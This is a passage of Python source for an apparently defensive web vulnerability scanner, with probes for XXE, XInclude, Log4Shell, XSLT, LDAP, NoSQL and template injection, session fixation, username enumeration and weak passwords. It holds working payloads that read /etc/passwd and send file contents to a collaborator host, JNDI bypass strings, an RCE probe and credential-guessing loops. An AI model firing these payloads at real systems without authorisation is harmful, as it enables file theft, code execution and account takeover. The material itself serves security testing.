            f'<!ENTITY % xxe SYSTEM "http://{uid}.xxe-param.{COLLAB_DOMAIN}/dtd">'
            f'%xxe;]><foo>test</foo>',
            "parameter entity OOB"
        ),
        # File exfil via OOB
        (
            f'<?xml version="1.0"?><!DOCTYPE foo ['
            f'<!ENTITY % file SYSTEM "file:///etc/passwd">'
            f'<!ENTITY % dtd SYSTEM "http://{uid}.xxe-exfil.{COLLAB_DOMAIN}/dtd">'
            f'%dtd;]><foo>test</foo>',
            "file exfil via OOB DTD"
        ),
        # UTF-7 encoded XXE
        (
            f'+/v8-<?xml version="1.0"?><!DOCTYPE foo ['
            f'<!ENTITY xxe SYSTEM "http://{uid}.xxe-utf7.{COLLAB_DOMAIN}/">'
            f']><foo>&xxe;</foo>',
            "UTF-7 XXE"
        ),
    ]

    content_types = [
        "application/xml",
        "text/xml",
        "application/soap+xml",
        "application/xhtml+xml",
    ]

    try:
        for payload, desc in xxe_payloads:
            for ct in content_types:
                resp = await _safe_post(
                    client, url,
                    content=payload.encode(),
                    headers={"Content-Type": ct},
                )
                if not resp:
                    continue
                # Check for signs of XXE processing
                if resp.status_code not in (400, 403, 404, 405, 415):
                    # Check if entity was resolved (file contents or error)
                    xxe_indicators = ["root:", "/bin/", "SYSTEM", "DOCTYPE", "entity", "passwd"]
                    if any(ind in resp.text for ind in xxe_indicators):
                        findings.append(_finding(
                            template_id="pro-oob-xxe",
                            name=f"Out-of-Band XXE ({desc})",
                            severity="high",
                            url=url,
                            description=(
                                f"Server processed XML with external entity reference. "
                                f"Technique: {desc}. Content-Type: {ct}. "
                                f"Check collaborator for DNS/HTTP interactions from {uid}.*.{COLLAB_DOMAIN}."
                            ),
                            confidence="tentative",
                            remediation="Disable external entity processing in XML parser. Use defusedxml.",
                        ))
                        return findings
                    # Even without indicators, note that XML was accepted
                    if resp.status_code == 200:
                        findings.append(_finding(
                            template_id="pro-oob-xxe-accepted",
                            name=f"XML Input Accepted ({desc})",
                            severity="info",
                            url=url,
                            description=(
                                f"Server accepted XML payload without error. "
                                f"Check collaborator for OOB interactions: {uid}.*.{COLLAB_DOMAIN}"
                            ),
                            confidence="tentative",
                            remediation="Disable external entity processing.",
                        ))
                        return findings
    except Exception as e:
        log.debug("oob_xxe error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 12. blind_xxe_error
# ═════════════════════════════════════════════════════════════════════════════

async def blind_xxe_error(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Blind XXE via XML parse errors that may leak file contents."""
    findings: list[ScanFinding] = []

    error_xxe_payloads = [
        # Nonexistent entity to trigger verbose error
        (
            '<?xml version="1.0"?><!DOCTYPE foo ['
            '<!ENTITY % file SYSTEM "file:///etc/passwd">'
            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">'
            '%eval;%error;]><foo>test</foo>',
            "error-based file exfil"
        ),
        # Invalid URI to trigger error with file content
        (
            '<?xml version="1.0"?><!DOCTYPE foo ['
            '<!ENTITY % file SYSTEM "file:///etc/hostname">'
            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'http://invalid/%file;\'>">'
            '%eval;%error;]><foo>test</foo>',
            "hostname exfil via error"
        ),
        # Windows path exfil
        (
            '<?xml version="1.0"?><!DOCTYPE foo ['
            '<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">'
            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">'
            '%eval;%error;]><foo>test</foo>',
            "Windows win.ini exfil"
        ),
        # Local DTD abuse (common on Linux)
        (
            '<?xml version="1.0"?><!DOCTYPE foo ['
            '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">'
            '<!ENTITY % ISOamso \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
            '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///x/%file;&#x27;>">'
            '&#x25;eval;&#x25;error;\'>'
            '%local_dtd;]><foo>test</foo>',
            "local DTD abuse"
        ),
    ]

    try:
        for payload, desc in error_xxe_payloads:
            resp = await _safe_post(
                client, url,
                content=payload.encode(),
                headers={"Content-Type": "application/xml"},
            )
            if not resp:
                continue

            text = resp.text.lower()
            # Check for file content leakage in error messages
            leak_indicators = [
                "root:", "/bin/bash", "/bin/sh", "nobody",  # /etc/passwd
                "[fonts]", "[extensions]",  # win.ini
                "no such file", "failed to open",  # error with path info
            ]
            for indicator in leak_indicators:
                if indicator in text:
                    findings.append(_finding(
                        template_id="pro-blind-xxe-error",
                        name=f"Blind XXE via Error ({desc})",
                        severity="high",
                        url=url,
                        description=(
                            f"XML parser error message contains sensitive data. "
                            f"Technique: {desc}. Indicator found: '{indicator}'"
                        ),
                        confidence="firm",
                        extracted=[indicator],
                        remediation="Disable external entity processing. Suppress verbose XML parser errors.",
                    ))
                    return findings
    except Exception as e:
        log.debug("blind_xxe_error error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 13. xinclude_injection
# ═════════════════════════════════════════════════════════════════════════════

async def xinclude_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """XInclude injection for XXE when you don't control the full XML document."""
    findings: list[ScanFinding] = []

    xinclude_payloads = [
        (
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
            '<xi:include parse="text" href="file:///etc/passwd"/></foo>',
            "text parse /etc/passwd"
        ),
        (
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
            '<xi:include parse="text" href="file:///c:/windows/win.ini"/></foo>',
            "text parse win.ini"
        ),
        (
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
            f'<xi:include parse="text" href="http://{COLLAB_DOMAIN}/xinclude"/></foo>',
            "OOB XInclude"
        ),
        (
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
            '<xi:include href="file:///etc/hostname"/></foo>',
            "XML parse /etc/hostname"
        ),
    ]

    try:
        # Try as XML body
        for payload, desc in xinclude_payloads:
            resp = await _safe_post(
                client, url,
                content=payload.encode(),
                headers={"Content-Type": "application/xml"},
            )
            if resp and ("root:" in resp.text or "[fonts]" in resp.text or "/bin/" in resp.text):
                findings.append(_finding(
                    template_id="pro-xinclude-injection",
                    name=f"XInclude Injection ({desc})",
                    severity="critical",
                    url=url,
                    description=f"XInclude injection successfully read server files. Technique: {desc}",
                    confidence="confirmed",
                    remediation="Disable XInclude processing in XML parser configuration.",
                ))
                return findings

        # Try injecting XInclude into regular parameters
        xi_param = '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
        for test_url in _inject_params(url, xi_param):
            resp = await _safe_get(client, test_url)
            if resp and ("root:" in resp.text or "[fonts]" in resp.text):
                findings.append(_finding(
                    template_id="pro-xinclude-param-injection",
                    name="XInclude Injection via Parameter",
                    severity="critical",
                    url=url,
                    description="XInclude payload in query parameter resulted in file read.",
                    confidence="confirmed",
                    matched_at=test_url,
                    remediation="Disable XInclude processing.",
                ))
                return findings
    except Exception as e:
        log.debug("xinclude_injection error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 14. log4shell
# ═════════════════════════════════════════════════════════════════════════════

async def log4shell(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Log4Shell (CVE-2021-44228) — JNDI injection in all common headers and parameters."""
    findings: list[ScanFinding] = []
    uid = hashlib.md5(url.encode()).hexdigest()[:8]

    jndi_payloads = [
        f"${{jndi:ldap://{uid}.log4j.{COLLAB_DOMAIN}/a}}",
        f"${{jndi:dns://{uid}.log4jdns.{COLLAB_DOMAIN}}}",
        f"${{jndi:rmi://{uid}.log4jrmi.{COLLAB_DOMAIN}/a}}",
        # Bypass variants
        f"${{${{lower:j}}ndi:ldap://{uid}.log4jbyp1.{COLLAB_DOMAIN}/a}}",
        f"${{${{upper:j}}${{upper:n}}${{upper:d}}${{upper:i}}:ldap://{uid}.log4jbyp2.{COLLAB_DOMAIN}/a}}",
        f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{uid}.log4jbyp3.{COLLAB_DOMAIN}/a}}",
        f"${{${{env:NaN:-j}}ndi${{env:NaN:-:}}${{env:NaN:-l}}dap${{env:NaN:-:}}//{uid}.log4jbyp4.{COLLAB_DOMAIN}/a}}",
    ]

    injection_headers = [
        "User-Agent", "X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP",
        "X-Client-IP", "X-Originating-IP", "Referer", "CF-Connecting_IP",
        "True-Client-IP", "X-WAP-Profile", "X-Api-Version", "Authorization",
        "Origin", "Accept-Language", "Cookie", "X-Custom-IP-Authorization",
        "Contact", "Forwarded", "X-Forwarded-Port", "X-Forwarded-Proto",
    ]

    try:
        for jndi in jndi_payloads[:3]:  # Use first 3 core payloads for headers
            headers = {h: jndi for h in injection_headers}
            resp = await _safe_get(client, url, headers=headers)
            if resp and resp.status_code not in (400, 403):
                findings.append(_finding(
                    template_id="pro-log4shell",
                    name="Log4Shell (CVE-2021-44228) — JNDI Injection",
                    severity="critical",
                    url=url,
                    description=(
                        f"JNDI lookup payloads sent in {len(injection_headers)} HTTP headers. "
                        f"Check collaborator for interactions from {uid}.*.{COLLAB_DOMAIN}. "
                        "If DNS/LDAP callback received, target is vulnerable to Log4Shell RCE."
                    ),
                    confidence="tentative",
                    remediation="Upgrade Log4j to 2.17.1+. Set log4j2.formatMsgNoLookups=true.",
                ))
                break

        # Also inject in query parameters
        for jndi in jndi_payloads[:2]:
            for test_url in _inject_params(url, jndi):
                resp = await _safe_get(client, test_url)

        # POST body injection
        for jndi in jndi_payloads[:2]:
            body_payloads = [
                {"username": jndi, "password": jndi},
                {"search": jndi, "q": jndi},
                jndi,  # raw body
            ]
            for body in body_payloads:
                if isinstance(body, dict):
                    await _safe_post(client, url, json=body)
                else:
                    await _safe_post(client, url, content=body.encode())
    except Exception as e:
        log.debug("log4shell error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 15. xslt_injection
# ═════════════════════════════════════════════════════════════════════════════

async def xslt_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """XSLT injection in XML inputs to detect server-side XSLT processing."""
    findings: list[ScanFinding] = []

    xslt_payloads = [
        (
            '<?xml version="1.0"?>'
            '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">'
            '<xsl:template match="/">'
            '<xsl:value-of select="system-property(\'xsl:version\')"/>'
            '</xsl:template></xsl:stylesheet>',
            r"[0-9]+\.[0-9]+",
            "xsl:version detection"
        ),
        (
            '<?xml version="1.0"?>'
            '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">'
            '<xsl:template match="/">'
            '<xsl:value-of select="system-property(\'xsl:vendor\')"/>'
            '</xsl:template></xsl:stylesheet>',
            r"(Apache|libxslt|Microsoft|Saxon|Xalan)",
            "xsl:vendor detection"
        ),
        (
            '<?xml version="1.0"?>'
            '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">'
            '<xsl:template match="/">'
            '<xsl:value-of select="document(\'file:///etc/passwd\')"/>'
            '</xsl:template></xsl:stylesheet>',
            r"root:",
            "XSLT file read"
        ),
    ]

    try:
        for payload, pattern, desc in xslt_payloads:
            for ct in ["application/xml", "text/xml", "application/xslt+xml"]:
                resp = await _safe_post(
                    client, url,
                    content=payload.encode(),
                    headers={"Content-Type": ct},
                )
                if not resp:
                    continue
                match = re.search(pattern, resp.text)
                if match:
                    findings.append(_finding(
                        template_id="pro-xslt-injection",
                        name=f"XSLT Injection ({desc})",
                        severity="high",
                        url=url,
                        description=(
                            f"XSLT processing detected. Technique: {desc}. "
                            f"Matched: {match.group(0)}"
                        ),
                        confidence="confirmed",
                        extracted=[match.group(0)],
                        remediation="Disable XSLT processing or use a sandboxed XSLT processor. Disable document() function.",
                    ))
                    return findings
    except Exception as e:
        log.debug("xslt_injection error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 16. blind_ldap_injection
# ═════════════════════════════════════════════════════════════════════════════

async def blind_ldap_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Timing-based and boolean-based LDAP injection detection."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return findings

    ldap_payloads = {
        "wildcard_true": "*",
        "wildcard_false": "nonexistent_xyzzy_12345",
        "bool_true": "*)(&",
        "bool_false": "*)(|",
        "close_filter": ")(cn=*",
        "or_always_true": "*)(|(cn=*",
        "and_bypass": "*)(%26",
        "null_byte": "*%00",
        "error_trigger": "\\",
    }

    try:
        baseline = await _safe_get(client, url)
        if not baseline:
            return findings

        for key in params:
            original_val = params[key][0]

            # Boolean test: wildcard should return results, nonexistent should not
            new_params_true = {k: v[0] for k, v in params.items()}
            new_params_true[key] = ldap_payloads["wildcard_true"]
            url_true = urlunparse(parsed._replace(query=urlencode(new_params_true)))

            new_params_false = {k: v[0] for k, v in params.items()}
            new_params_false[key] = ldap_payloads["wildcard_false"]
            url_false = urlunparse(parsed._replace(query=urlencode(new_params_false)))

            resp_true = await _safe_get(client, url_true)
            resp_false = await _safe_get(client, url_false)

            if not resp_true or not resp_false:
                continue

            # Check for significant response differential
            len_diff = abs(len(resp_true.text) - len(resp_false.text))
            if len_diff > 100 and len(resp_true.text) > len(resp_false.text):
                findings.append(_finding(
                    template_id="pro-blind-ldap-injection",
                    name="Blind LDAP Injection (Boolean-Based)",
                    severity="high",
                    url=url,
                    description=(
                        f"Parameter '{key}' shows significant response differential with LDAP wildcard (*). "
                        f"Wildcard response: {len(resp_true.text)} bytes, "
                        f"nonexistent: {len(resp_false.text)} bytes (diff: {len_diff}). "
                        "Suggests LDAP query injection."
                    ),
                    confidence="tentative",
                    matched_at=url_true,
                    remediation="Use LDAP input validation. Escape special LDAP characters (*, (, ), \\, NUL).",
                ))
                break

            # Test filter injection payloads
            for payload_name, payload in ldap_payloads.items():
                if payload_name in ("wildcard_true", "wildcard_false"):
                    continue
                new_params = {k: v[0] for k, v in params.items()}
                new_params[key] = original_val + payload
                test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                resp = await _safe_get(client, test_url)
                if not resp:
                    continue

                # LDAP error messages
                ldap_errors = [
                    "ldap", "invalid filter", "bad search filter",
                    "javax.naming", "LdapException", "NamingException",
                    "search filter", "dn:", "objectclass",
                ]
                for err in ldap_errors:
                    if err.lower() in resp.text.lower() and err.lower() not in baseline.text.lower():
                        findings.append(_finding(
                            template_id="pro-ldap-error-injection",
                            name="LDAP Injection (Error-Based)",
                            severity="high",
                            url=url,
                            description=(
                                f"LDAP error triggered in parameter '{key}' with payload '{payload}'. "
                                f"Error indicator: '{err}'"
                            ),
                            confidence="firm",
                            matched_at=test_url,
                            remediation="Escape LDAP special characters in user input.",
                        ))
                        return findings
    except Exception as e:
        log.debug("blind_ldap_injection error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 17. nosql_advanced
# ═════════════════════════════════════════════════════════════════════════════

async def nosql_advanced(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Advanced NoSQL injection: MongoDB $where, $gt, CouchDB _all_docs, Redis EVAL."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)

    # MongoDB injection payloads via JSON
    mongo_json_payloads = [
        ({"$where": "1==1"}, {"$where": "1==2"}, "MongoDB $where boolean"),
        ({"$gt": ""}, {"$gt": None}, "MongoDB $gt operator"),
        ({"$ne": ""}, {"$ne": None}, "MongoDB $ne operator"),
        ({"$regex": ".*"}, {"$regex": "^$impossible$"}, "MongoDB $regex"),
        ({"$where": "sleep(100)"}, None, "MongoDB $where sleep (timing)"),
    ]

    # MongoDB injection via query string
    mongo_param_payloads = [
        ("[$gt]=", "MongoDB $gt via param"),
        ("[$ne]=", "MongoDB $ne via param"),
        ("[$regex]=.*", "MongoDB $regex via param"),
        ('{"$gt":""}', "MongoDB JSON in param"),
    ]

    try:
        # Test JSON body payloads
        params = parse_qs(parsed.query, keep_blank_values=True)
        if params:
            for key in params:
                for true_val, false_val, desc in mongo_json_payloads:
                    body_true = {key: true_val}
                    body_false = {key: false_val} if false_val is not None else None

                    resp_true = await _safe_post(client, url, json=body_true)
                    if not resp_true:
                        continue

                    if false_val is not None:
                        resp_false = await _safe_post(client, url, json=body_false)
                        if resp_false and abs(len(resp_true.text) - len(resp_false.text)) > 50:
                            findings.append(_finding(
                                template_id="pro-nosql-advanced",
                                name=f"NoSQL Injection ({desc})",
                                severity="high",
                                url=url,
                                description=(
                                    f"Response differential with NoSQL operator injection in '{key}'. "
                                    f"True: {len(resp_true.text)} bytes, False: {len(resp_false.text) if resp_false else 0} bytes."
                                ),
                                confidence="tentative",
                                remediation="Validate and sanitize NoSQL query inputs. Use parameterized queries.",
                            ))
                            break

                # Test param-based injection
                for payload, desc in mongo_param_payloads:
                    new_params = {k: v[0] for k, v in params.items()}
                    test_key = f"{key}{payload}"
                    test_url = f"{url}&{quote(test_key)}"
                    resp = await _safe_get(client, test_url)
                    if resp and resp.status_code == 200:
                        baseline = await _safe_get(client, url)
                        if baseline and abs(len(resp.text) - len(baseline.text)) > 100:
                            findings.append(_finding(
                                template_id="pro-nosql-param",
                                name=f"NoSQL Injection ({desc})",
                                severity="high",
                                url=url,
                                description=f"NoSQL operator injection via parameter: {desc}",
                                confidence="tentative",
                                matched_at=test_url,
                                remediation="Sanitize query parameters against NoSQL operators.",
                            ))
                            break

        # CouchDB _all_docs check
        base = f"{parsed.scheme}://{parsed.netloc}"
        couch_paths = ["/_all_dbs", "/_all_docs", "/_utils", "/_config"]
        for path in couch_paths:
            resp = await _safe_get(client, urljoin(base, path))
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, list) or "rows" in str(data):
                        findings.append(_finding(
                            template_id="pro-couchdb-exposed",
                            name=f"CouchDB Endpoint Exposed ({path})",
                            severity="high",
                            url=urljoin(base, path),
                            description=f"CouchDB endpoint {path} accessible without authentication.",
                            confidence="confirmed",
                            remediation="Restrict access to CouchDB admin endpoints.",
                        ))
                except Exception:
                    pass
    except Exception as e:
        log.debug("nosql_advanced error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 18. expression_language_injection
# ═════════════════════════════════════════════════════════════════════════════

async def expression_language_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Java EL, Spring SpEL, and OGNL expression injection detection."""
    findings: list[ScanFinding] = []

    el_payloads = [
        # Java EL
        ("${7*7}", "49", "Java EL"),
        ("${7*7}", "49", "Java EL (alt)"),
        ("#{7*7}", "49", "Spring SpEL"),
        ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime", "Java EL RCE probe"),
        # Spring SpEL
        ("#{T(java.lang.Math).random()}", "0.", "Spring SpEL Math.random"),
        ("#{3*3}", "9", "Spring SpEL multiply"),
        # OGNL (Struts)
        ("%{7*7}", "49", "OGNL injection"),
        ("%{#context}", "OgnlContext", "OGNL context access"),
        # Freemarker
        ("${7?string}", "7", "Freemarker"),
        ("<#assign x=7*7>${x}", "49", "Freemarker assign"),
        # Thymeleaf
        ("__${7*7}__", "49", "Thymeleaf preprocessor"),
        # Pebble
        ("{% set x = 7*7 %}{{x}}", "49", "Pebble template"),
        # Jinja2 / Twig (bonus)
        ("{{7*7}}", "49", "Jinja2/Twig"),
        ("{{7*'7'}}", "7777777", "Jinja2 string multiply"),
    ]

    try:
        for payload, expected, desc in el_payloads:
            for test_url in _inject_params(url, payload):
                resp = await _safe_get(client, test_url)
                if not resp:
                    continue
                if expected in resp.text:
                    # Verify it's not just the payload echoed back
                    if payload not in resp.text or expected != payload:
                        findings.append(_finding(
                            template_id="pro-expression-lang-injection",
                            name=f"Expression Language Injection ({desc})",
                            severity="critical",
                            url=url,
                            description=(
                                f"Expression evaluated server-side. Payload: {payload} -> Output contains: {expected}. "
                                f"Engine: {desc}. This may lead to Remote Code Execution."
                            ),
                            confidence="confirmed",
                            matched_at=test_url,
                            extracted=[expected],
                            remediation="Do not pass user input to template/EL engines. Use sandboxed rendering.",
                        ))
                        return findings

            # Also try POST
            resp = await _safe_post(client, url, data={"input": payload})
            if resp and expected in resp.text and payload not in resp.text:
                findings.append(_finding(
                    template_id="pro-el-injection-post",
                    name=f"Expression Language Injection via POST ({desc})",
                    severity="critical",
                    url=url,
                    description=f"EL payload '{payload}' evaluated in POST body. Engine: {desc}",
                    confidence="confirmed",
                    extracted=[expected],
                    remediation="Do not pass user input to template engines.",
                ))
                return findings
    except Exception as e:
        log.debug("expression_language_injection error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 19. session_fixation
# ═════════════════════════════════════════════════════════════════════════════

async def session_fixation(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Detect session fixation by comparing pre-auth and post-auth session cookies."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    SESSION_COOKIE_NAMES = [
        "sessionid", "session_id", "sid", "phpsessid", "jsessionid",
        "asp.net_sessionid", "aspsessionid", "cfid", "cftoken",
        "connect.sid", "_session", "sess", "token", "auth_token",
    ]

    try:
        # Phase 1: get pre-auth session
        login_paths = ["/login", "/signin", "/auth", "/account/login", "/api/auth/login", parsed.path]
        pre_auth_cookies = {}

        for path in login_paths:
            resp = await _safe_get(client, urljoin(base, path))
            if resp and resp.cookies:
                for name, value in resp.cookies.items():
                    if name.lower() in SESSION_COOKIE_NAMES or "sess" in name.lower():
                        pre_auth_cookies[name] = value
                if pre_auth_cookies:
                    break

        if not pre_auth_cookies:
            return findings

        # Phase 2: simulate login with fixed session
        login_data = {"username": "admin", "password": "admin"}
        for path in ["/login", "/signin", "/auth", "/api/auth/login"]:
            resp = await _safe_post(
                client,
                urljoin(base, path),
                data=login_data,
                cookies=pre_auth_cookies,
            )
            if not resp:
                continue

            # Check if session cookie changed after "auth"
            post_auth_cookies = {}
            for name, value in resp.cookies.items():
                if name in pre_auth_cookies:
                    post_auth_cookies[name] = value

            for name in pre_auth_cookies:
                if name in post_auth_cookies:
                    if pre_auth_cookies[name] == post_auth_cookies[name]:
                        findings.append(_finding(
                            template_id="pro-session-fixation",
                            name="Session Fixation",
                            severity="high",
                            url=url,
                            description=(
                                f"Session cookie '{name}' was not regenerated after authentication. "
                                f"Pre-auth value: {pre_auth_cookies[name][:20]}... "
                                f"Post-auth value: {post_auth_cookies[name][:20]}... (identical). "
                                "An attacker can fixate a session ID and hijack the authenticated session."
                            ),
                            confidence="tentative",
                            remediation="Regenerate session ID after successful authentication.",
                        ))
                        return findings

        # Check for session cookie attributes
        for path in login_paths:
            resp = await _safe_get(client, urljoin(base, path))
            if resp:
                set_cookies = resp.headers.get_list("set-cookie") if hasattr(resp.headers, 'get_list') else [resp.headers.get("set-cookie", "")]
                for sc in set_cookies:
                    if not sc:
                        continue
                    sc_lower = sc.lower()
                    for sess_name in SESSION_COOKIE_NAMES:
                        if sess_name in sc_lower:
                            issues = []
                            if "httponly" not in sc_lower:
                                issues.append("missing HttpOnly")
                            if "secure" not in sc_lower:
                                issues.append("missing Secure")
                            if "samesite" not in sc_lower:
                                issues.append("missing SameSite")
                            if issues:
                                findings.append(_finding(
                                    template_id="pro-session-cookie-flags",
                                    name="Insecure Session Cookie Attributes",
                                    severity="low",
                                    url=urljoin(base, path),
                                    description=f"Session cookie '{sess_name}' has: {', '.join(issues)}.",
                                    confidence="confirmed",
                                    remediation="Set HttpOnly, Secure, and SameSite flags on session cookies.",
                                ))
                            break
                if findings:
                    break
    except Exception as e:
        log.debug("session_fixation error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 20. username_enumeration
# ═════════════════════════════════════════════════════════════════════════════

async def username_enumeration(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Detect username enumeration via response differential (content, length, timing)."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    login_paths = ["/login", "/signin", "/auth", "/api/auth/login", "/api/login", "/account/login"]
    likely_valid = ["admin", "root", "user", "test", "administrator"]
    invalid_user = "pxenonexistent_xzy_99"

    try:
        for path in login_paths:
            login_url = urljoin(base, path)

            # Test with invalid user
            t1 = time.time()
            resp_invalid = await _safe_post(
                client, login_url,
                data={"username": invalid_user, "password": "wrongpass123"},
            )
            t1_elapsed = time.time() - t1

            if not resp_invalid or resp_invalid.status_code in (404, 405):
                # Try JSON
                resp_invalid = await _safe_post(
                    client, login_url,
                    json={"username": invalid_user, "password": "wrongpass123"},
                )
                if not resp_invalid or resp_invalid.status_code in (404, 405):
                    continue

            invalid_text = resp_invalid.text
            invalid_len = len(invalid_text)
            invalid_status = resp_invalid.status_code

            # Test with likely valid usernames
            for valid_user in likely_valid:
                t2 = time.time()
                resp_valid = await _safe_post(
                    client, login_url,
                    data={"username": valid_user, "password": "wrongpass123"},
                )
                t2_elapsed = time.time() - t2

                if not resp_valid:
                    resp_valid = await _safe_post(
                        client, login_url,
                        json={"username": valid_user, "password": "wrongpass123"},
                    )
                    if not resp_valid:
                        continue

                valid_text = resp_valid.text
                valid_len = len(valid_text)
                valid_status = resp_valid.status_code

                # Check for differences
                diffs = []
                if valid_status != invalid_status:
                    diffs.append(f"status code differs ({valid_status} vs {invalid_status})")
                if abs(valid_len - invalid_len) > 20:
                    diffs.append(f"response length differs ({valid_len} vs {invalid_len})")
                if valid_text != invalid_text:
                    # Check for specific enumeration phrases
                    enum_phrases_valid = ["incorrect password", "wrong password", "invalid password", "password is incorrect"]
                    enum_phrases_invalid = ["user not found", "no account", "doesn't exist", "not registered", "invalid username"]
                    for phrase in enum_phrases_valid:
                        if phrase in valid_text.lower() and phrase not in invalid_text.lower():
                            diffs.append(f"error message differs ('{phrase}' only for valid user)")
                    for phrase in enum_phrases_invalid:
                        if phrase in invalid_text.lower() and phrase not in valid_text.lower():
                            diffs.append(f"error message differs ('{phrase}' only for invalid user)")

                # Timing difference > 200ms
                time_diff = abs(t2_elapsed - t1_elapsed)
                if time_diff > 0.2:
                    diffs.append(f"timing differs ({t1_elapsed:.3f}s vs {t2_elapsed:.3f}s)")

                if diffs:
                    findings.append(_finding(
                        template_id="pro-username-enumeration",
                        name="Username Enumeration",
                        severity="medium",
                        url=login_url,
                        description=(
                            f"Login endpoint reveals valid usernames. Differences detected: "
                            f"{'; '.join(diffs)}. Tested '{valid_user}' (potentially valid) vs "
                            f"'{invalid_user}' (definitely invalid)."
                        ),
                        confidence="tentative",
                        remediation="Use generic error messages for authentication failures.",
                    ))
                    return findings
    except Exception as e:
        log.debug("username_enumeration error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 21. password_policy
# ═════════════════════════════════════════════════════════════════════════════

async def password_policy(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Test weak password acceptance, lockout detection, and rate limiting."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    login_paths = ["/login", "/signin", "/auth", "/api/auth/login", "/api/login"]
    register_paths = ["/register", "/signup", "/api/auth/register", "/api/register"]

    weak_passwords = ["123456", "password", "1", "a", "12", "abc", "qwerty", "admin"]

    try:
        # Test weak password acceptance on registration endpoints
        for path in register_paths:
            reg_url = urljoin(base, path)
            for weak_pw in weak_passwords:
                resp = await _safe_post(client, reg_url, json={
                    "username": f"pxetest_{hashlib.md5(weak_pw.encode()).hexdigest()[:6]}",
                    "email": f"pxetest_{weak_pw}@test.invalid",
                    "password": weak_pw,
                })
                if not resp:
                    resp = await _safe_post(client, reg_url, data={
                        "username": f"pxetest_{weak_pw}",
                        "email": f"pxetest_{weak_pw}@test.invalid",
                        "password": weak_pw,
                    })
                if resp and resp.status_code in (200, 201, 302):
                    error_indicators = ["too short", "too weak", "requirements", "complexity", "must contain"]
                    if not any(ind in resp.text.lower() for ind in error_indicators):
                        findings.append(_finding(
                            template_id="pro-weak-password-policy",
                            name="Weak Password Accepted",
                            severity="medium",
                            url=reg_url,
                            description=f"Registration accepted extremely weak password: '{weak_pw}'.",
                            confidence="tentative",
                            remediation="Enforce minimum password length (8+) and complexity requirements.",
                        ))
                        break

        # Test account lockout / rate limiting on login
        for path in login_paths:
            login_url = urljoin(base, path)
            responses = []
            for i in range(12):
                resp = await _safe_post(client, login_url, data={
                    "username": "admin",
                    "password": f"wrongpass{i}",
                })
                if resp:
                    responses.append(resp)

            if len(responses) >= 10:
                # Check if all responses are identical (no lockout)
                statuses = [r.status_code for r in responses]
                if len(set(statuses)) == 1:
                    findings.append(_finding(
                        template_id="pro-no-account-lockout",
                        name="No Account Lockout After Failed Logins",
                        severity="medium",
                        url=login_url,
                        description=(
                            f"12 failed login attempts with no lockout or rate limiting detected. "
                            f"All responses returned status {statuses[0]}."
                        ),
                        confidence="tentative",
                        remediation="Implement account lockout after 5-10 failed attempts. Add rate limiting.",
                    ))
                    break
                # Check for rate limiting (429)
                if 429 not in statuses:
                    # Check if responses got slower (progressive delay)
                    pass  # No rate limit detected
    except Exception as e:
        log.debug("password_policy error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 22. auth_bypass_expanded
# ═════════════════════════════════════════════════════════════════════════════

async def auth_bypass_expanded(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Default credentials, admin no-auth, JWT none-alg, JWT alg-switch."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    # Default credentials
    default_creds = [
        ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
